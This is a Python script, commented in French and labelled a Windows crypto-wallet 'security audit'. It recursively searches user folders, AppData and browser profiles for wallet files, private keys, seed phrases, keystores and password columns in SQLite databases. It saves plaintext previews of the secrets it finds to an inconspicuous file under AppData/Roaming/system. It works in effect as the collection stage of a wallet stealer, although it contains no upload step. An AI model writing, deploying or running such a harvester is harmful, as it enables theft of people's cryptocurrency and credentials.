import os
import json
import sqlite3
import re
import hashlib
import argparse
import sys
import time
import logging
import platform
from datetime import datetime
from typing import Dict, List, Optional, Any

# Configuration du logging silencieux
logging.basicConfig(
    level=logging.CRITICAL,
    format='%(message)s'
)
logger = logging.getLogger(__name__)

class OutputManager:
    """Gestionnaire des sorties fichiers texte"""
    
    def __init__(self, output_file: str = "program_results.txt"):
        self.output_file = output_file
        self.results = []
    
    def generate_report(self, scanned_files: int, findings: List[Dict]) -> str:
        """Génère le rapport complet en texte"""
        report_lines = []
        report_lines.append("=" * 80)
        report_lines.append("AUDIT DE SECURITE PORTEFEUILLES CRYPTO - WINDOWS")
        report_lines.append("=" * 80)
        report_lines.append(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report_lines.append(f"Système: Windows {platform.release()}")
        report_lines.append(f"Fichiers analysés: {scanned_files}")
        report_lines.append(f"Découvertes sensibles: {len(findings)}")
        report_lines.append("")
        
        if findings:
            by_type = {}
            for finding in findings:
                finding_type = finding['type']
                if finding_type not in by_type:
                    by_type[finding_type] = []
                by_type[finding_type].append(finding)
            
            report_lines.append("RESUME:")
            report_lines.append("-" * 40)
            for finding_type, findings_list in sorted(by_type.items()):
                report_lines.append(f"{finding_type}: {len(findings_list)}")
            report_lines.append("")
            
            report_lines.append("DETAILS DES FICHIERS SENSIBLES:")
            report_lines.append("-" * 40)
            
            for i, finding in enumerate(findings, 1):
                report_lines.append(f"\n[{i}] {finding['type'].upper()}")
                report_lines.append(f"Fichier: {finding['file_path']}")
                report_lines.append(f"Taille: {finding.get('file_size', 'N/A')} octets")
                report_lines.append(f"Modifié: {finding.get('modified', 'N/A')}")
                report_lines.append(f"SHA256: {finding.get('hash', 'N/A')}")
                
                if 'preview' in finding:
                    report_lines.append(f"Aperçu: {finding['preview']}")
                
                if 'table' in finding and 'column' in finding:
                    report_lines.append(f"Base: {finding['table']}.{finding['column']}")
        else:
            report_lines.append("AUCUN FICHIER SENSIBLE DETECTE")
        
        report_lines.append("\n" + "=" * 80)
        report_lines.append("SCAN TERMINE")
        report_lines.append("=" * 80)
        
        return '\n'.join(report_lines)
    
    def save_report(self, scanned_files: int, findings: List[Dict]):
        """Sauvegarde le rapport dans un fichier"""
        report_content = self.generate_report(scanned_files, findings)
        
        try:
            output_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'system', self.output_file)
            
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(report_content)
            print(f"[+] Rapport sauvegarde: {output_path}")
        except Exception as e:
            print(f"[-] Erreur sauvegarde rapport: {e}")

class CryptoWalletScanner:
    """Scanner Windows pour portefeuilles crypto"""
    
    def __init__(self):
        self.scanned_files = 0
        self.findings = []
        
        self.patterns = {
            'private_key': [
                r'-----BEGIN PRIVATE KEY-----[A-Za-z0-9+/=\s]+-----END PRIVATE KEY-----',
                r'-----BEGIN RSA PRIVATE KEY-----[A-Za-z0-9+/=\s]+-----END RSA PRIVATE KEY-----',
                r'-----BEGIN EC PRIVATE KEY-----[A-Za-z0-9+/=\s]+-----END EC PRIVATE KEY-----',
                r'["\']?private_key["\']?\s*[:=]\s*["\']([A-Za-z0-9+/=]{40,})["\']',
            ],
            'seed_phrase': [
                r'\b([a-z]+\s){11,23}[a-z]+\b',
                r'\bseed(?:_?phrase)?["\']?\s*[:=]\s*["\']([a-z\s]+)["\']',
                r'\bmnemonic["\']?\s*[:=]\s*["\']([a-z\s]+)["\']',
                r'\brecovery(?:_?phrase)?["\']?\s*[:=]\s*["\']([a-z\s]+)["\']',
            ],
            'keystore': [
                r'\{"address":".+","crypto":.+,"id":".+","version":\d+\}',
            ],
            'wallet_file': [
                r'wallet\.dat',
                r'\.wallet$',
            ],
            'config_file': [
                r'\[Wallet\]',
                r'"privateKey"',
                r'"mnemonic"',
                r'"seed"',
            ]
        }
        
        self.target_extensions = {
            '.json', '.txt', '.dat', '.db', '.sqlite', '.sqlite3',
            '.wallet', '.key', '.pem', '.keystore', '.config', '.conf',
            '.env', '.yml', '.yaml', '.toml', '.ini', '.log', '.backup'
        }
    
    def get_windows_directories(self) -> List[str]:
        """Retourne les répertoires Windows à scanner"""
        dirs = []
        home = os.path.expanduser('~')
        
        # Répertoires utilisateur standard
        windows_dirs = [
            home,
            os.path.join(home, 'Desktop'),
            os.path.join(home, 'Documents'),
            os.path.join(home, 'Downloads'),
            os.path.join(home, 'AppData', 'Roaming'),
            os.path.join(home, 'AppData', 'Local'),
            os.path.join(home, 'AppData', 'LocalLow'),
            'C:/ProgramData',
            'C:/Program Files',
            'C:/Program Files (x86)',
        ]
        
        # Scanner les dossiers d'applications dans AppData/Roaming
        appdata_roaming = os.path.join(home, 'AppData', 'Roaming')
        if os.path.exists(appdata_roaming):
            for item in os.listdir(appdata_roaming):
                full_path = os.path.join(appdata_roaming, item)
                if os.path.isdir(full_path):
                    wallet_keywords = [
                        'bitcoin', 'ethereum', 'metamask', 'exodus', 
                        'electrum', 'atomic', 'trust', 'coinbase',
                        'ledger', 'trezor', 'phantom', 'solana',
                        'binance', 'crypto', 'wallet'
                    ]
                    if any(keyword in item.lower() for keyword in wallet_keywords):
                        dirs.append(full_path)
        
        # Scanner les dossiers d'applications dans AppData/Local
        appdata_local = os.path.join(home, 'AppData', 'Local')
        if os.path.exists(appdata_local):
            for item in os.listdir(appdata_local):
                full_path = os.path.join(appdata_local, item)
                if os.path.isdir(full_path):
                    wallet_keywords = [
                        'Google', 'Chrome', 'Brave', 'Microsoft', 'Edge',
                        'bitcoin', 'ethereum', 'metamask', 'exodus'
                    ]
                    if any(keyword in item for keyword in wallet_keywords):
                        dirs.append(full_path)
        
        # Ajouter uniquement les répertoires qui existent
        for dir_path in windows_dirs:
            if os.path.exists(dir_path):
                dirs.append(dir_path)
        
        return list(set(dirs))  # Supprimer les doublons
    
    def scan_directory(self, directory: str, depth: int = 3) -> List[Dict]:
        """Scan récursif d'un répertoire Windows"""
        findings = []
        
        try:
            for root, dirs, files in os.walk(directory):
                current_depth = root[len(directory):].count(os.sep)
                if current_depth > depth:
                    dirs.clear()
                    continue
                
                for file in files:
                    file_path = os.path.join(root, file)
                    self.scanned_files += 1
                    
                    ext = os.path.splitext(file)[1].lower()
                    file_lower = file.lower()
                    
                    if (ext in self.target_extensions or 
                        any(keyword in file_lower for keyword in ['wallet', 'keystore', 'seed', 'private', 'backup', 'key'])):
                        
                        file_findings = self._analyze_file(file_path)
                        if file_findings:
                            findings.extend(file_findings)
        
        except PermissionError:
            pass
        except Exception:
            pass
        
        return findings
    
    def _analyze_file(self, file_path: str) -> List[Dict]:
        """Analyse un fichier"""
        findings = []
        
        try:
            file_stats = os.stat(file_path)
            if file_stats.st_size > 50 * 1024 * 1024:  # 50MB max
                return findings
            
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
            except:
                with open(file_path, 'r', encoding='latin-1', errors='ignore') as f:
                    content = f.read()
            
            for key_type, patterns in self.patterns.items():
                for pattern in patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    if matches:
                        for match in matches:
                            if isinstance(match, tuple):
                                match_text = match[0] if match[0] else ''.join(match[1:])
                            else:
                                match_text = match
                            
                            if self._is_valid_finding(key_type, match_text):
                                findings.append({
                                    'file_path': file_path,
                                    'type': key_type,
                                    'preview': match_text[:80],
                                    'file_size': file_stats.st_size,
                                    'modified': datetime.fromtimestamp(file_stats.st_mtime),
                                    'hash': self._calculate_file_hash(file_path)
                                })
            
            if file_path.endswith('.json'):
                json_findings = self._analyze_json(file_path, content)
                findings.extend(json_findings)
            
            if file_path.endswith(('.db', '.sqlite', '.sqlite3')):
                db_findings = self._analyze_sqlite(file_path)
                findings.extend(db_findings)
        
        except Exception:
            pass
        
        return findings
    
    def _analyze_json(self, file_path: str, content: str) -> List[Dict]:
        """Analyse JSON"""
        findings = []
        
        try:
            data = json.loads(content)
            
            if isinstance(data, dict):
                if 'crypto' in data and 'address' in data:
                    findings.append({
                        'file_path': file_path,
                        'type': 'ethereum_keystore',
                        'preview': f"Address: {data.get('address', 'N/A')[:20]}...",
                    })
                
                self._search_json(data, file_path, findings)
        
        except:
            pass
        
        return findings
    
    def _search_json(self, data, file_path: str, findings: List[Dict], path: str = ""):
        """Recherche récursive dans JSON"""
        if isinstance(data, dict):
            for key, value in data.items():
                current_path = f"{path}.{key}" if path else key
                
                sensitive_keys = ['private', 'secret', 'seed', 'mnemonic', 'key', 'password', 'phrase']
                if any(sensitive in key.lower() for sensitive in sensitive_keys):
                    if isinstance(value, str) and len(value) > 8:
                        findings.append({
                            'file_path': file_path,
                            'type': 'json_sensitive',
                            'key': current_path,
                            'preview': value[:60],
                        })
                
                self._search_json(value, file_path, findings, current_path)
        
        elif isinstance(data, list):
            for i, item in enumerate(data):
                current_path = f"{path}[{i}]"
                self._search_json(item, file_path, findings, current_path)
    
    def _analyze_sqlite(self, file_path: str) -> List[Dict]:
        """Analyse SQLite"""
        findings = []
        
        try:
            conn = sqlite3.connect(file_path)
            cursor = conn.cursor()
            
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
            tables = cursor.fetchall()
            
            for table in tables:
                table_name = table[0]
                
                cursor.execute(f"PRAGMA table_info({table_name})")
                columns = cursor.fetchall()
                
                for col in columns:
                    col_name = col[1].lower()
                    if any(keyword in col_name for keyword in ['private', 'secret', 'key', 'seed', 'mnemonic', 'phrase', 'password']):
                        try:
                            cursor.execute(f"SELECT {col[1]} FROM {table_name} WHERE {col[1]} IS NOT NULL LIMIT 5")
                            rows = cursor.fetchall()
                            
                            for row in rows:
                                if row[0] and len(str(row[0])) > 8:
                                    findings.append({
                                        'file_path': file_path,
                                        'type': 'database_data',
                                        'table': table_name,
                                        'column': col[1],
                                        'preview': str(row[0])[:60],
                                    })
                        except:
                            continue
            
            conn.close()
        
        except:
            pass
        
        return findings
    
    def _is_valid_finding(self, key_type: str, content: str) -> bool:
        """Vérifie si valide"""
        content = content.strip()
        
        if not content or len(content) < 10:
            return False
        
        if key_type == 'seed_phrase':
            words = content.split()
            if len(words) < 12 or len(words) > 24:
                return False
            
            valid_words = sum(1 for word in words if word.isalpha() and word.islower())
            if valid_words < len(words) * 0.7:
                return False
        
        elif key_type == 'private_key':
            if len(content) < 40:
                return False
        
        return True
    
    def _calculate_file_hash(self, file_path: str) -> str:
        """Calcule SHA256"""
        sha256 = hashlib.sha256()
        
        try:
            with open(file_path, 'rb') as f:
                for chunk in iter(lambda: f.read(4096), b''):
                    sha256.update(chunk)
            return sha256.hexdigest()[:16]
        except:
            return "N/A"

def run_windows_scan(depth: int = 3, output_file: str = "program_results.txt") -> Dict[str, Any]:
    """
    Exécute le scan Windows
    
    Args:
        depth: Profondeur de scan
        output_file: Fichier de sortie
    
    Returns:
        Résultats
    """
    scanner = CryptoWalletScanner()
    all_findings = []
    
    print(f"[*] Démarrage scan Windows...")
    
    target_dirs = scanner.get_windows_directories()
    
    for directory in target_dirs:
        print(f"[*] Scanning: {directory}")
        findings = scanner.scan_directory(directory, depth)
        all_findings.extend(findings)
    
    output_manager = OutputManager(output_file)
    output_manager.save_report(scanner.scanned_files, all_findings)
    
    return {
        "scanned_files": scanner.scanned_files,
        "findings": all_findings,
        "output_file": output_file
    }

def parse_arguments():
    """Parse arguments ligne de commande"""
    parser = argparse.ArgumentParser(
        description="Audit Windows portefeuilles crypto",
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    parser.add_argument('-d', '--depth', type=int, default=3,
                       help='Profondeur de scan (défaut: 3)')
    
    parser.add_argument('-o', '--output', type=str, default="program_results.txt",
                       help='Fichier de sortie (défaut: program_results.txt)')
    
    parser.add_argument('-dir', '--directory', action='append', dest='directories',
                       help='Répertoire(s) spécifique(s) à scanner')
    
    return parser.parse_args()

def main():
    """Fonction principale"""
    # Vérification que c'est bien Windows
    if platform.system() != 'Windows':
        print(f"[-] Ce script est conçu pour Windows uniquement")
        print(f"[-] OS détecté: {platform.system()}")
        print(f"[-] Utilisez la version multi-OS pour les autres systèmes")
        sys.exit(1)
    
    args = parse_arguments()
    
    print(f"[*] Audit Windows Crypto Wallet")
    print(f"[*] Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("")
    
    start_time = time.time()
    
    if args.directories:
        scanner = CryptoWalletScanner()
        all_findings = []
        
        for directory in args.directories:
            if os.path.exists(directory):
                print(f"[*] Scanning: {directory}")
                findings = scanner.scan_directory(directory, args.depth)
                all_findings.extend(findings)
            else:
                print(f"[-] Répertoire inexistant: {directory}")
        
        output_manager = OutputManager(args.output)
        output_manager.save_report(scanner.scanned_files, all_findings)
        
        results = {
            "scanned_files": scanner.scanned_files,
            "findings": all_findings,
            "output_file": args.output
        }
    else:
        results = run_windows_scan(args.depth, args.output)
    
    elapsed_time = time.time() - start_time
    
    print("")
    print("=" * 50)
    print("SCAN TERMINE")
    print("=" * 50)
    print(f"Durée: {elapsed_time:.1f}s")
    print(f"Fichiers analysés: {results['scanned_files']}")
    print(f"Fichiers sensibles: {len(results['findings'])}")
    print(f"Rapport: {results['output_file']}")
    print("=" * 50)

if __name__ == "__main__":
    main()